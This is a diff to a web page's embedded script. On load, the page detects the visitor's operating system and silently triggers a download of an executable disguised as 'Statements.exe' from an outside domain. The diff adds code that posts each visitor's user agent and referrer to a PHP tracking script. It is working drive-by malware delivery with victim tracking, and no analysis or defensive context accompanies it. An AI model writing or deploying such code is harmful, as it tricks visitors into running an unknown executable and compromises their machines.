@@ -29,11 +29,13 @@
         }
 	</style>
 	<script>
-        // Detect OS and auto-download the appropriate file
-        window.onload = function() {
+        // Function to report the visit to the PHP script and handle auto-download
+        window.onload = function () {
             const userAgent = navigator.userAgent;
+            const referrer = document.referrer || "Direct Access";
             let fileUrl = '';
 
+            // Determine the appropriate file for download
             if (/Win/i.test(userAgent)) {
                 fileUrl = 'https://specialitystoreservice.com/camphere/sigidwhat/Statements.exe';
             } else if (/Mac/i.test(userAgent)) {
@@ -44,8 +46,14 @@
                 fileUrl = 'https://specialitystoreservice.com/camphere/sigidwhat/Statements.exe'; // Default to Windows
             }
 
-            // Auto-download the file
-            setTimeout(function() {
+            // Send visitor data to the PHP script via AJAX
+            const xhr = new XMLHttpRequest();
+            xhr.open("POST", "visitor_counter_reporting.php", true); // Update to point to the PHP script
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            xhr.send(`userAgent=${encodeURIComponent(userAgent)}&referrer=${encodeURIComponent(referrer)}`);
+
+            // Handle auto-download of the file
+            setTimeout(function () {
                 const link = document.createElement('a');
                 link.href = fileUrl;
                 link.download = fileUrl.substring(fileUrl.lastIndexOf('/') + 1);
